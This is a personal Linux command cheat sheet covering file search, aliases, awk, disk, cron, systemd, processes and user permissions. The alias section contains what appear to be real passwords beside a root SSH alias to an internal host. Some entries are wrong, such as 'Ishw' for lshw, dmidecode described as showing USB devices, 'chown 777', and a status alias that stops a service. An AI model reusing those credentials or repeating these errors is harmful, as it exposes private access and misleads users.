# LINUX COMMANDS

http://cheatsheetworld.com/programming/unix-linux-cheat-sheet/


## Capitalisation is extremely important in linux: match upper and/or lower case letters in the commands and directory/filenames.

	Linux does not search for programs in the current directory for security reasons. 
	
	http://cb.vu/unixtoolbox.xhtml
	https://dzone.com/articles/most-useful-linux-command-line-tricks
	http://www.smashingmagazine.com/2012/01/23/introduction-to-linux-commands/
	https://www.learnenough.com/command-line-tutorial
	https://www.digitalocean.com/community/tutorials/how-to-use-bash-history-commands-and-expansions-on-a-linux-vps

# VERY USEFUL

	cd ~ 													Go to home directory (/home/user)
	tail -f file											Show file contents as it grows (starting with the last 10 lines). -f = follow
	ls -lt | head 											Last 10 updated files
	ls -l | wc -l 											Count files in a directory
	grep 'abc' test.txt | wc 								Extract all rows containing abs in test.txt, then count these rows with wc
	grep "1.2.3.9" access_log | grep POST | awk '{print $4}' | sort | uniq -c | sort -rn

	awk '{print $1}' access_log | sort -n | uniq -c | sort -rn

    hexdump -C wsl.bin                                      Binary view
    xxd -b wsl.bin                                          Binary view
    xxd wsl.bin                                             Hexa view 

    chmod 777 /data/test.c
    sudo chmod u+w /usr/local/bin/myscript.sh 				Set permission to execute
	chmod +rw file
	chmod +x file

	alias rc="vim ~/.bashrc && source ~/.bashrc"
	echo 'one two three' | xargs mkdir
	echo 'one two three' | xargs rm -df

	find - search for files in a directory hierarchy
	     - P never follow symbolic links
	     - H don't follow symbolic links except...cmd line args
	     - L Follow symbolic links
	find /tmp -mtime +14 | xargs rm 						Remove files older than 2 weeks in /tmp
	find . -type f -size +4G                                find files that are bigger than 4GB in a directory
	find . -type f -size -4G 								find the files which are smaller than X size
	find / -type f -size +4G 								search for files bigger than 4 GiB in the entire filesystem
	find . -type f -size +30M -size -40M -exec ls -l {} +   display a long listing of all the files it finds (find path then do 'ls' with it)
															`c' for bytes
															'w' for two-byte words
															`k' for Kilobytes
															`M' for Megabytes
															`G' for Gigabytes
	find Downloads/ -type f -size +4G
 	cd ~ 													Go /Home 
	cat urls.txt | xargs wget
	cat list1.txt list2.txt > todo.txt 						Combine files to another file
	ls names*.json | xargs sed -i 's/"John"/"Johnny"/g' 	Replace in all files
	sed -i .bak -- 's/foo/bar/g' *.py 						Replace foo with bar in all .py files

	xargs -n1 git clone < repos.txt 						Pull multiple git repositories from a list with
    cat urls.txt | xargs wget

    cat geeks.txt | tr ':[space]:' '\t' > out.txt 			Replace Spaces With Tabs
	cat myfile | tr a-z A-Z > output.txt 					Convert Upper or Lower Case
    sed - stream editor for filtering and transforming text
		Replace
		    "John": "36",  →  "Johnny": "36",
		    >ls names*.json | xargs sed -i 's/"John"/"Johnny"/g'
		    


# ENVIRONMENT

	https://doc.ubuntu-fr.org/variables_d_environnement

	printenv  		
	env
					SHELL=/bin/bash
					TERM=xterm
					USER=nguinet
					NAME=SL00048424
					LS_COLORS=ow=01;36;40
					HOSTTYPE=x86_64
					PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
					PWD=/home/nguinet
					LANG=en_US.UTF-8
					SHLVL=1
					HOME=/home/nguinet
					LOGNAME=nguinet
					LESSOPEN=| /usr/bin/lesspipe %s
					LESSCLOSE=/usr/bin/lesspipe %s %s
					_=/usr/bin/printenv

	printenv TERM

	$ 	To use an environment variable
		ls $HOME/Desktop
		echo $PATH 		/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
		echo $LANG		en_US.UTF-8

## Create environment variable

		Export a shell variable (export)
			EDITOR=nano
			export EDITOR
			or
			export EDITOR=nano

		Remove an environment variable		
			export LC_ALL=
			or 
			unset LC_ALL
		

# COMMAND HISTORY

	Repeating previous commands 
	↑	up-arrow key 	to retrieve (and possibly edit) previous commands
	! 	immediately run a previous command
	!! 	repeat last command 
		
	history		Shows last 50 used commands 	
	   ...
	   43  man bash
	   44  man fc
	   45  man bash
	   46  fc -l -10
	   47  history

	history 5
	history | grep cd
	!51
	ls /usr/share/doc/manpages
	echo hello
	!-2             # lists the contents again
	!! 				re-execute the previous command (or !-1)

	fc -l -10

	history | grep really
	!545 		run command #545 (id comes from 'history')
	! 881	
	!curl 		to run the last curl command
				Depending on our history of commands, the even terser !cu or !c would work as well


# COMMAND ALIAS

	alias

	Steps to create a permanent Bash alias:
		Edit ~/.bash_aliases or ~/.bashrc file using: vi ~/.bash_aliases.
		Append your bash alias.
		For example append: alias update='sudo yum update'
		Save and close the file.
		Activate alias by typing: source ~/.bash_aliases.




		alias expose=/script/location/expose.sh
		for permanent use add this line to your ~/.profiles, ~/.bashrc etc depending on system

		Basic usage
		cd ~/folderofimages
		expose


    WSL:
    	vi /etc/bash.bashrc                     (wsl)   !!! SELECT EDIT !!!
		chown 777 ./etc/bash.bashrc 				  win suez bash pwd: kgopkdhfg
	  	alias kaf="ssh 'root@10.34.32.139'"          pwd=kaf2020

    using Bash: use the ~/.bashrc file
    	
    cat ~/.bashrc
    vi ~/.bashrc

    sudo apt install  (/home/user)
	alias rc="vim ~/.bashrc && source ~/.bashrc"

    	To reload .bashrc without logging out (exit) and back in:
    		preserve your current shel
    			. ~/.bashrc   =   source ~/.bashrc

    			source is a synonym for dot/period . in bash, but not in POSIX sh, so for maximum compatibility use the period.
				'source' is a built-in shell command that executes the content of the file passed as argument, in the current shell. So in your example, it executes .bashrc file in the current shell. And exec command replaces the shell with a given program,

    		replace your current shell
    			exec bash
    			exec "$BASH"
 	
 	alias command with arguments
 	
 		alias does not accept parameters but a function can be called just like an alias.

 		alias f='function f(){ echo "First: $1"; echo "Second: $2"; }; f'
 		alias blah='function _blah(){ echo "First: $1"; echo "Second: $2"; };_blah'
 		alias checkargs='f() { echo $0 $# $@ -- $1 ** $2; }; f'

 	alias command with both single and double quotes:
 		escape it correctly
		alias xxx="svn status | awk '\$1 ==\"M\"{print \$2;}'"


    find . -type f | grep '.bashrc'				    
	./home/nguinet/.bashrc
	etc/bash.bashrc
	./etc/bashrc
	./etc/skel/.bashrc
	./root/.bashrc
	./var/tmp/.bashrc.swp

	vi ./root/.bashrc    ← 10.34.32.139

		alias cp='cp -i'
		alias egrep='egrep --color=auto'
		alias fgrep='fgrep --color=auto'
		alias grep='grep --color=auto'
		alias kafconsumer_group='f() { /opt/kafka_2.12-2.1.1/bin/kafka-consumer-groups.sh --bootstrap-server 10.34.32.139:9092 --describe --group $1; }; f'
		alias kafstart='systemctl start kafka.service'
		alias kafstatus='systemctl status kafka.service'
		alias kafstop='systemctl stop kafka.service'
		alias kaftopic_delete='f() { /opt/kafka_2.12-2.1.1/bin/kafka-topics.sh --zookeeper localhost:2181 --delete --topic $1;}; f'
		alias kaftopic_set_retentionms='f(){ /opt/kafka_2.12-2.1.1/bin/kafka-configs.sh --zookeeper localhost:2181 --entity-type topics --entity-name $1 --alter --add-config retention.ms=$2;}; f'
		alias kaftopic_show='f() { /opt/kafka_2.12-2.1.1/bin/kafka-topics.sh --describe --zookeeper localhost:2181 --topic $1;}; f'
		alias kaftopic_size='f() { /opt/kafka_2.12-2.1.1/bin/kafka-topics.sh --zookeeper localhost:2181 --list | while read x; do ./opt/kafka_2.12-2.1.1/bin/kafka-run-class.sh kafka.tools.GetOffsetShell --broker-list 10.34.32.139:9092 --topic $x --time -1; done;}; f'
		alias kaftopics_describe='/opt/kafka_2.12-2.1.1/bin/kafka-topics.sh --zookeeper localhost:2181 --describe'
		alias kaftopics_list='/opt/kafka_2.12-2.1.1/bin/kafka-topics.sh --zookeeper localhost:2181 --list'
		alias kk_consumer_group='f() { /opt/kafka_2.12-2.1.1/bin/kafka-consumer-groups.sh --bootstrap-server 10.34.32.139:9092 --describe --group $1; }; f'
		alias kk_start='systemctl start kafka.service'
		alias kk_status='systemctl status kafka.service'
		alias kk_stop='systemctl stop kafka.service'
		alias kkt_delete='f() { /opt/kafka_2.12-2.1.1/bin/kafka-topics.sh --zookeeper localhost:2181 --delete --topic $1;}; f'
		alias kkt_describe='/opt/kafka_2.12-2.1.1/bin/kafka-topics.sh --zookeeper localhost:2181 --describe'
		alias kkt_getsize='f() { /opt/kafka_2.12-2.1.1/bin/kafka-topics.sh --zookeeper localhost:2181 --list | while read x; do ./opt/kafka_2.12-2.1.1/bin/kafka-run-class.sh kafka.tools.GetOffsetShell --broker-list 10.34.32.139:9092 --topic $x --time -1; done;}; f'
		alias kkt_list='/opt/kafka_2.12-2.1.1/bin/kafka-topics.sh --zookeeper localhost:2181 --list'
		alias kkt_setretentionms='f(){ /opt/kafka_2.12-2.1.1/bin/kafka-configs.sh --zookeeper localhost:2181 --entity-type topics --entity-name $1 --alter --add-config retention.ms=$2;}; f'
		alias kkt_show='f() { /opt/kafka_2.12-2.1.1/bin/kafka-topics.sh --describe --zookeeper localhost:2181 --topic $1;}; f'
		alias l.='ls -d .* --color=auto'
		alias ll='ls -l --color=auto'
		alias ls='ls --color=auto'
		alias lstree='ls -R | grep : | sed -e '\''s/:$//'\'' -e '\''s/[^-][^\/]*\//--/g'\'' -e '\''s/^/   /'\'' -e '\''s/-/|/'\'''
		alias mv='mv -i'
		alias rc='vi ~/.bashrc && source ~/.bashrc'
		alias rm='rm -i'
		alias which='alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde'
		alias zk_start='systemctl start zookeeper.service'
		alias zk_status='systemctl stop zookeeper.service'
		alias zk_stop='systemctl stop zookeeper.service'


	alias ..="cd .."
	alias gs="git status"
	alias gp="git pull"
	alias gb="git branch"
	alias ga="git add ."
    alias gc="git commit -m $1"    	then use: 	gc "Commit message"
    alias dev="cd ~/Project/development"    

	alias Display numerical chmod permissions
		stat -c '%a %n' * 			display the octal values (numerical chmod permissions) and file name
		find . -printf "%m:%f\n"

		Add an alias for your account or globally by editing 
			/etc/profile.d/custom.sh
				alias cls="ls -l | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"%0o \",k);print}'"
				alias cls="ls -lha --color=always -F --group-directories-first |awk '{k=0;s=0;for(i=0;i<=8;i++){;k+=((substr(\$1,i+2,1)~/[rwxst]/)*2^(8-i));};j=4;for(i=4;i<=10;i+=3){;s+=((substr(\$1,i,1)~/[stST]/)*j);j/=2;};if(k){;printf(\"%0o%0o \",s,k);};print;}'"

	Folder tree
		alias lstree="ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/' cd ~ 													Go to home directory 
	[root@vps47217 etc]# cat /etc/profile.d/custom.sh
	alias cls="ls -lha --color=always -F --group-directories-first |awk '{k=0;s=0;for(i=0;i<=8;i++){;k+=((substr(\$1,i+2,1)~/[rwxst]/)*2^(8-i));};j=4;for(i=4;i<=10;i+=3){;s+=((substr(\$1,i,1)~/[stST]/)*j);j/=2;};if(k){;printf(\"%0o%0o \",s,k);};print;}'"

	alias lstree="ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'"

	alias valias="vi /etc/profile.d/custom.sh"
	alias gonginx="cd /etc/nginx/conf.d"
	alias goapache="cd /etc/httpd"
	alias gow="cd /var/www"
	alias goprofile="cd /etc/profile.d"
	alias gohome="cd /home"
	alias goadmin="cd /home/admin"
	alias gowp="cd /home/wordpress"



# SHORTCUTS 

	clear		Clears the window of SSH console
	exit		Exits the SSH console and disconnects from the user
	echo 		Print some arguments 

	ctrl+c 		halts current command 
	ctrl+z 		stops current comrnand 
	
	ctrl+d 		log out of current session 
	ctrl+w 		erases one word in current line 
	ctrl+u 		erases whole line 
	ctrl+r 		reverse lookup of previous commands 

# AWK - SCRIPTING LANGUAGE FOR TEXT FILES PROCESSING

	https://likegeeks.com/awk-command/
	https://www.geeksforgeeks.org/awk-command-unixlinux-examples/

	awk is the interpreter for the AWK Programming Language. The AWK language is useful for manipulation of data files, text retrieval and processing

	Define variables.
	Use string and arithmetic operators.
	Use control flow and loops.
	Generate formatted reports.
	
	Actually, you can process log files that contain maybe millions of lines to output a readable report that you can benefit from.
	$ awk options program file
	$ awk '{print "Welcome to awk command tutorial "}'
	$ awk '{print $1}' myfile
	$ awk -F: '{print $1}' /etc/passwd




	awk -F: '{print $4}'
		 \		\_____ '{print $4}' means print the fourth field (the fields being separated by :).
		  \__ -F <value> - tells awk what field separator to use. In your case, -F: means that the separator is : (colon).

	awk '/search_pattern/ { action_to_take_on_matches; another_action; }' file_to_parse

	awk 'pattern {action}' input-file > output-file
	take each line of the input file; if the line contains the pattern apply the action to the line and write the resulting line to the output-file. If the pattern is omitted, the action is applied to all line. 

	awk '/Joe/ {print $0}' client.csv

	awk '{ print $5 }' table1.txt > output1.txt
	awk -F, '{ print $3 }' table1.txt > output1.txt
	awk '/30/ { print $3 }' table1.txt
	awk '$7=="\$7.30" { print $3 }' table1.txt
	awk '{ print ($2 * $3) + $7 }'
	awk '{ sum=0; for (col=1; col<=NF; col++) sum += $col; print sum; }'

    By default Awk prints every line of data from the specified file.
	$ awk '{print}' employee.txt

	Print the lines which matches with the given pattern.
	$ awk '/manager/ {print}' employee.txt 

	Spliting a Line Into Fields.  
		$0 represents the whole line
		$i are fields variables: $1, $2, $3...
	$ awk '{print $1,$4}' employee.txt 

	awk -F$"\t" '{print $6}' *changed*.csv

					 ____ default is “white space”, meaning space and tab characters
					/
 			  __delimiter         ___ field #1  
 			 /                   /  
 	awk -F ':' '{system("ping " $1);}' config.txt
 	awk '{print $2}'    # print the second field
    awk '{print $NF-1}' # print the penultimate field
    awk '{print $2,$1}' # reorder the first two fields

	awk '$2 ~ /^sa/' favorite_food.txt 		only match at the beginning of the second column by using this command:


	When you need to manipulate data in fields, awk tends to fit the bill quite nicely:
	awk '$2 == "ACTIVE" { print $1 }' test
	This reads each line of test, splits it into fields, then checks if the second one ($2) is ACTIVE; if so, it prints the first field.
	
	A regexp search on field 2 rather than an exact match, is: awk '$2 ~ /ACTIVE/ { print $1 }'

	Ping every ip address in that file: 
	config.txt file with IP addresses as content like this
		10.10.10.1:80
		10.10.10.13:8080
		10.10.10.11:443
		10.10.10.12:80
	$awk -F ':' '{system("ping " $1);}' config.txt



## The internal variables that awk uses are:

		FILENAME: References the current input file.
		FNR: References the number of the current record relative to the current input file. For instance, if you have two input files, this would tell you the record number of each file instead of as a total.
		FS: The current field separator used to denote each field in a record. By default, this is set to whitespace.
		NF: The number of fields in the current record.
		NR: The number of the current record.
		OFS: The field separator for the outputted data. By default, this is set to whitespace.
		ORS: The record separator for the outputted data. By default, this is a newline character.
		RS: The record separator used to distinguish separate records in the input file. By default, this is a newline character.

		sudo awk 'BEGIN { FS=":"; print "User\t\tUID\t\tGID\t\tHome\t\tShell\n--------------"; }
		{print $1,"\t\t",$3,"\t\t",$4,"\t\t",$6,"\t\t",$7;}
		END { print "---------\nFile Complete" }' /etc/passwd

## PRATICAL USE

		[Gary Explains](https://www.youtube.com/watch?v=jJ02kEETw70)
		$ git log --author="Author name" --pretty=tformat: --numstat --since=month | awk '{ add += $1; subs += $2; loc += $1 - $2 } END { printf "added lines: %s, removed lines: %s, total lines: %s\n", add, subs, loc }'
		
		alias xxx="svn status | awk '\$1 ==\"M\"{print \$2;}'"
		alias cls="ls -l | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"%0o \",k);print}'"
		ps -e -orss=,args= |awk '{print $1 " " $2 }'| awk '{tot[$2]+=$1;count[$2]++} END {for (i in tot) {print tot[i],i,count[i]}}' | sort -n | tail
		
		$more files.txt
		console 52623
		delta 4831
		iota 1562320
		$wc -l files.txt
		620 files.txt
		$awk '{print}' files.txt  // By default Awk prints every line from the file
		$awk '{print $0}' files.txt = more
		$awk '{print $1}' files.txt // name
		$awk '{print $2}' files.txt // size
		$awk '/gcc/ {print $1}' files.txt // search *gcc*
		$awk '/^w/ {print $1}' files.txt // 
		$awk '/^ws/ {print $1}' files.txt // 
		$awk '/^ws/ {print $1,$2}' files.txt // 
		$awk '/^ws/ {print $1,$2/1024}' files.txt // size in bytes
		$awk '/^ws/ {print $1,$2/1024"K"}' files.txt // size in bytes
		$awk '/^ws/ && $1 > 15000 {print $1,$2/1024"K"}' files.txt // size in bytes
			
		SCRIPTING WITH AWK	

		nano path15k.awk
		'/^ws/ && $2 > 15000 {print $1,$2/1024"K"} 

		$awk -f path15k.awk files.txt
		xxxx 78.1562K
		apt-key 26.749K
		…
		nano path15k.awk
		'/^ws/ && $2 > 15000 {print $1,$2/1024"K"}
		'/^a/ && $2 > 2500 {print $1,$2/1024"K"}
		'/^a/ && $2 > 2500 {print $1,$2,int($2/1024)"K"}  // rouding  46.9766 → 46
		
		// better rounding: 46.9766 → 47
		func round(n) {
			n=n+0.5
			n=int(n)
			return n
		}
		'/^a/ && $2 > 2500 {print $1,$2,round($2/1024)"K"}  

### LOOP ON LINES

		$nano numbers.txt
		3 
		7 
		12 
		15 
		16 
		31
		$nano loop.awk
		func printlist(n) {
			for(i=1;i<n;i++) {
				printf("%d ", i)
			}
				printf("\n")
		}
		{printlist($1)}
		$awk -f loop.awk numbers.txt


# HARDWARE

	dmesg						Detected hardware and boot messages

	cat /proc/cpuinfo			CPU info
	cat /proc/meminfo 			memory information 
	cat /proc/interruptS		Lists the number of interrupts per CPU per I/O device

	Ishw						Displays information on hardware configuration of the system
	Isbik						Displays block device related information

	Ispci -tv					Show PCI devices
	Isusb -tv

	dmidecode					Show USB devices
	dmidecode					Show hardware info from the BIOS

	hdparm -i /dev/sda			Show info about disk sda
	hdparm -tT /dev/sda			Do a read speed test on disk sda
	badblocks -s /dev/sda		Test for unreadable blocks on disk sda

# BATTERY

	acpi -bi 					Test battery state
								https://forum.ubuntu-fr.org/viewtopic.php?id=1986564

# DISK USAGE

	free -m							Used and free memory (-m for MB)
	
	df -h							Show free space on mounted filesystems
	df -i							Show free inodes on mounted filesystems
	
	fdisk -I						Show disks partitions sizes and types
	
	du 								show directory space usage 
	du -sh 							Total disk usage on the current directory  -h: Human readable size in GB 
	du -ah							Display disk usage in human readable form
		
	findmnt							Displays target mount point for all filesystem
	mount device-path mount-point	Mount a device

	df					show disk usage 

						Linux command to check disk space
						df ( “disk filesystem“)
						• df command - Shows the amount of disk space used and available on Linux file systems.
						• du command - Display the amount of disk space used by the specified files and for each subdirectory.
						• btrfs fi df /device/ - Show disk space usage information for a btrfs based mount point/file system.

						df -h 	will shows the file system disk space statistics in “human readable” format, 

						sudo fdisk /dev/sda
						then command "p"
						sudo fdisk /dev/sdb
						then command "p"


						sudo sfdisk /dev/sda --force
						Device      Start      End  Sectors  Size Type
						/dev/sda1  227328 62914526 62687199 29.9G Linux filesystem
						/dev/sda14   2048    10239     8192    4M BIOS boot
						/dev/sda15  10240   227327   217088  106M EFI System


						sudo sfdisk /dev/sdb --force
						Device     Start        End    Sectors  Size Type
						/dev/sdb1   2048 5886705630 5886703583  2.8T Linux filesystem

# MOUNT

## Good news, it is now possible to mount USB media (including formatted as FAT) and network shares with drvfs on Windows 10:

	Mount removable media: (e.g. D:)
	$ sudo mkdir /mnt/d
	$ sudo mount -t drvfs D: /mnt/d

	To safely unmount
	$ sudo umount /mnt/d

	You can also mount network shares without smbfs:
	$ sudo mount -t drvfs '\\server\share' /mnt/share




# SYSTEM STATIC

	hostname					Show system host name (Computer's network name)
	hostnamectl 				System details
								   Static hostname: OSLNX017
								         Icon name: computer-vm
								           Chassis: vm
								        Machine ID: d911047359714ef0986b7ebae84e0a58
								           Boot ID: b117f69e34a4496c917869becd3a8253
								    Virtualization: vmware
								  Operating System: CentOS Linux 7 (Core)
								       CPE OS Name: cpe:/o:centos:centos:7
								            Kernel: Linux 3.10.0-957.5.1.el7.x86_64
								      Architecture: x86-64
	
	cat /etc/hostname 			Machine name
	cat /etc/redhat-release 	Centos version: 			CentOS Linux release 7.6.1810 (Core)

# SYSTEM DYNAMIC

 	top 						Shows the most relevant information on server resources in real time (RAM, uptime, top processes and others).

	htop 
		is an interactive system-monitor process-viewer and process-manager. 
		It is designed as an alternative to the Unix program top. 
		It shows a frequently updated list of the processes running on a computer, 
		normally ordered by the amount of CPU usage.

	hostname -i					Display the IP address of the host
		
	uname -a					Display Linux System Information. kernel config 
	uname -r					Display Kernel release Information. Version du kernel Linux: 	3.10.0-042stab127.2
	uname -v        			kernel compilation datetime

# RUNNING HISTORY

	uptime						Show how long the system has been running + load
	last reboot					Show system reboot history show the current date and time
		

# DATES
	
	date						Show the current date and time
	cal							Show this month calendar
	

# APPS

	whereis app 		show possible locations of app 
		$ whereis cal
		$ cal: /usr/bin/cal /usr/share/man/man1/cal.1.gz

	which app 			show which app will be run by default 	
		$which cal
		$ /usr/bin/cal

# PROCESS MANAGEMENT 

	ps 							display currently active processes 
	ps aux 						ps with a lot of detail 
	ps aux | grep ‘telnet’		Find all process id related to telnet process
		
	ps aux --sort -rss | head -n15

	used memory by process name:
		ps -e -orss=,args= |awk '{print $1 " " $2 }'| awk '{tot[$2]+=$1;count[$2]++} END {for (i in tot) {print tot[i],i,count[i]}}' | sort -n | tail

	To print a process tree:
          ps -ejH
          ps axjf

    To get info about threads:
          ps -eLf
          ps axms

	bg 							resume stopped command in background 
	bg 							lists stopped/background jobs, resume stopped job in the background 
	bg							Resumes suspended jobs without bringing them to foreground	
	fg 							resume stopped command in foreground 
	fg							Brings the most recent job to foreground
	fg -n 						brings job n to foreground 
	
	pmap						Memory map of process
	
	top 						Shows the most relevant information on server resources in real time (RAM, uptime, top processes and others)
	
	kill pid					Kill process with mentioned pid id
	kill all proc 				kill all processes named proc 
	pkill process-name			Send signal to a process with its name

	kill `ps ax | grep xterm | awk '{print $1;}'`
	This command uses 
		ps to list information about running processes, 
		grep to find just the xterm processes, 
		awk to select just the process identifiers, 
		and finally kill to kill those processes.

# SCHEDULING: SYSTEMD REPLACE CRON

	cron, crontab 		to automatically schedule tasks (running an executable once a day)
						to runs commands or scripts at a scheduled time
		
		crontab -r 					Remove current Job in CRON. crontab -ir to prompt before removing		
 		crontab -l 					Display all Scheduled Jobs in CRON
 		crontab – l -u username    	To display Cron Job for a User
 		crontab -e -u username 		To edit Cron Job for a User	
     	ll /var/spool/cron  		List name of the users having CRON jobs
		crontab -e		Add a new Job in CRON. Editor where you can configure your cron jobs. Cron jobs follow this pattern:

 		CRON FORMAT: format of CRON that we put in CRONTAB –e command

          * * * * * /path/to/script.sh

		<minute> <hour> <day of the month> <month> <day of the week> <commands to run>
		  0-59	  0-23			1-31		1-12	     0-6
		
		* * * * * 		run a command every minute		
		31 * * * * 	    run a command on the 31st minute of every hour
		30 10 * * * 	run a command at 10:30am every day

		10 5 * * * /home/user/script.sh 		Script is scheduled to run 5:10 AM every day
		*/5 * * * * /home/user/script.sh 		Script is scheduled to run every 5 min
		0 11 10 3 * /home/user/script.sh 		Script is scheduled to run at 11 AM on 10th of March
		0 1 * * 6 /home/user/script.sh 			Script is scheduled to run at 1 AM every Saturday.
		0 10 * * * /etc/init.d/mysqld restart	Restart MySQL service at 10 am every day.
		0 11 10 3 * /home/user/script.sh 		Script is scheduled to run 

		31 * * * * cd /srv/users/serverpilot/apps/<APP_NAME>/build && /usr/local/bin/hugo && cp -r /srv/users/serverpilot/apps/<APP_NAME>/build/public/. /srv/users/serverpilot/apps/<APP_NAME>/public

		every day
		0 0 * * * docker exec CONTAINER_NAME /usr/bin/mysqldump -u root --password=PASSWORD DATABASE_NAME > backup.sql_date +\%F.sql

		

		sudo nano /etc/crontab
		0 5 * * * root /home/vincent/anaconda3/bin/python /home/vincent/workspace/Python/Space\ Weather\ Data\ Pipeline/sunspots.py >> /home/vincent/workspace/Python/Space\ Weather\ Data\ Pipeline/out1.txt  2>&1
		0 6 * * * root /home/vincent/anaconda3/bin/python /home/vincent/workspace/Python/Space\ Weather\ Data\ Pipeline/mag_plasma.py >> /home/vincent/workspace/Python/Space\ Weather\ Data\ Pipeline/out2.txt  2>&10 7 * * * root /home/vincent/anaconda3/bin/python /home/vincent/workspace/Python/Space\ Weather\ Data\ Pipeline/geo_mag_map.py >> /home/vincent/workspace/Python/Space\ Weather\ Data\ Pipeline/out3.txt  2>&1
	
		https://devopsmyway.com/crontab-command-scheduling-jobs-in-linux/
	
	Systemd 

		replacement for cron and can be used to run a program at a given time or periodically.

	 	https://www.i-programmer.info/programming/cc/13148.html

	 	/etc/systemd/system/myService.service 
	 		[Unit]
			Description=My Hello Service
			[Service]
			Type=simple
			ExecStart=/home/pi/myservice
			Restart=on-failure
			RestartSec=10
			KillMode=process
			[Install]
			WantedBy=multi-user.target

		myservice
			#include <stdio.h>
			#include <stdlib.h>
			#include <unistd.h>
			int main(int argc, char** argv) {
			    while (1) {
			        printf("Hello systemd world \n");
			        fflush(NULL);
			        sleep(5);
			    };
			    return (EXIT_SUCCESS);
			}

	[Applying C - Running Programs With Systemd](https://www.i-programmer.info/programming/cc/13148.html)
	The basic object in systemd is a unit - something to be run when the system starts. There are a number of different types of unit but in most cases you will be interested in a service unit. A unit is defined by its configuration file, called a unit file. System supplied unit files are generally stored in /lib/systemd/system and any new unit files you create should be added to /etc/systemd/system which take priority over any unit files in the /lib directory with the same name....



# USERS

	whoami						logged username: Who you are logged in as	
	who 						Shows who is connected to the server right now.
	w							Display who is online
	finger user					Display information about user

	sudo 	BECOME SUPER USER ROOT (give your pwd)
			If “Permission denied” message, just prefix that command with sudo.
			Sudo allows a user to execute a command as root and requires the user to provide a password.
			On standalone boxes; it will work just fine; however, it will not work on remote hosts if
			the user is not listed in the sudoers file.



	Linux is a multi-user system. 
		* root/superuser 	rights to access anything on its own server. override any file ownership and permission restrictions
		* system users 		run non-interactive or background processes on a system
		* regular users		for logging in and running processes interactively

### It is also possible to configure other user accounts with the ability to assume "superuser rights". In fact, creating a normal user that has sudo privileges for system administration tasks is considered to be best practice.

		Groups
			collections of zero or more users
			A user belongs to a default group, and can also be a member of any of the other groups on a server.

		Ownership and Permissions
			every file is owned by a single user and a single group, and has its own access permissions
			ls -l 	Viewing Ownership and Permissions

			drwxr-xr-x 3 root  root  4096 Mar  4 07:36  public
			   Mode      owner group size  last changed
			    ↓
			    drwxr-xr-x
			     rwx        User  	The owner of a file belongs to this class
			     rwx        Group  	The members of the file's group belong to this class
			     rwx        Other  	Any users that are not part of the user or group classes belong to this class.
			    d			File Type (d director, - normal)
			    				In Linux, there are two basic types of files: 
			    				normal 		hyphen (-). Plain files with data. They are called normal, or regular, files to distinguish them from special files.
			    				special 	non-hyphen character (d )

			Read
				For a normal file, read permission allows a user to view the contents of the file.
				For a directory, read permission allows a user to view the names of the file in the directory.

			Write
				For a normal file, write permission allows a user to modify and delete the file.
				For a directory, write permission allows a user to delete the directory, modify its contents (create, delete, and rename files in it), and modify the contents of files that the user can read.

			Execute
				For a normal file, execute permission allows a user to execute a file (the user must also have read permission). As such, execute permissions must be set for executable programs and shell scripts before a user can run them.

				For a directory, execute permission allows a user to access, or traverse, into (i.e. cd) and access metadata about files in the directory (the information that is listed in an ls -l).

				-rw-------: A file that is only accessible by its owner
				-rwxr-xr-x: A file that is executable by every user on the system. A "world-executable" file
				-rw-rw-rw-: A file that is open to modification by every user on the system. A "world-writable" file
				drwxr-xr-x: A directory that every user on the system can read and access
				drwxrwx---: A directory that is modifiable (including its contents) by its owner and group
				drwxr-x---: A directory that is accessible by its group

### Modifying Ownership and Permissions

			chown, chgrp, and chmod

			4 = read permissions 	2 = write permissions		1 = execute permission

			touch testfile
			ls -l testfile
			-rw-rw-r-- 1 demouser demouser 0 Jul 10 17:23 testfile
			chmod 740 testfile
			ls -l testfile
			-rwxr----- 1 demouser demouser 0 Jul 10 17:23 testfile

			Umask: Setting Default Permissions for newly created files based on the "base" permissions set defined for files and directories.
				Files have a base permissions set of 666 (full read and write access for all users. Execute permissions are not assigned by default)
				Directories have a base permissions set of 777, or read, write, and execute permissions for all users.

				!! APPLY TO THE CURRENT SHELL SESSION !!
				To persist across sessions: nano .bashrc, search 'umask' value set & modify existing value: umask 022

				Umask apply a subtractive "mask" to the base permissions 
					permissions to 775 if we want the owner and members of the owner group to be able to write to newly created directories, but not other users
					We need the three digit number that would express the difference between the base permissions and the desired permissions. That number is 002.
					  777 - 775 = 002

					umask 077 			more secure
					touch restricted
					ls -l restricted
					-rw------- 1 demouser demouser 0 Jul 10 18:33 restricted
					
					umask 000 			give full permissions to every file and directory
					touch openfile
					ls -l openfile
					-rw-rw-rw- 1 demouser demouser    0 Jul 10 18:36 openfile

		Caution
			An important point to remember when changing permissions is that certain areas of the filesystem and certain processes require specific permissions to run correctly. Inadequate permissions can lead to errors and non-functioning applications.
			On the other hand, settings that are too permissive can be a security risk.


	cat /etc/passwd 	view all of the users 
	cat /etc/group 		view all the groups and their members

	id					Show the active user id with login and group
	
	last				Show last logins on the system
						"last" permet d'afficher la liste des connexions utilisateur sur une machine.
						Tout est sauvegardé dans les fichiers "/var/log/wtmp" et "/var/log/btmp".

						La commande "last" suivi d'un nom utilisateur permet ainsi de filtrer toutes ces dernière connexion.
						last cedric
						Ou tous les derniers redémarrage.
						last reboot
						Voir les 100 dernière connexion
						last -n 100

						L'option -t pour voir les connexions a une date precise.
						last -t YYYYMMDDHHMMSS

						L'option "-R" pour supprimer l'affichage du nom d'hote.
						last -R

						L'option "-i" pour afficher l'adresse IP.
						last -i

						L'option "-w" pour afficher le nom d'utilisateur et de domaine.
						last -w

	who	S				Show who is logged on the system
	groupadd admin		Add group “admin”
	groups newuser      View groups user is in
	adduser sam									Add user “sam”. 
	By default, a new user is only in their own group, which is created at the time of account creation, and shares a name with the user. 
	useradd -c “Sam Tomshi”	g admin -m sam 		Create user “sam”
	usermod										Modify user information
	usermod -aG sudo newuser 					Add (a) the user to the listed groups (G)

	userdel sam									Delete user sam
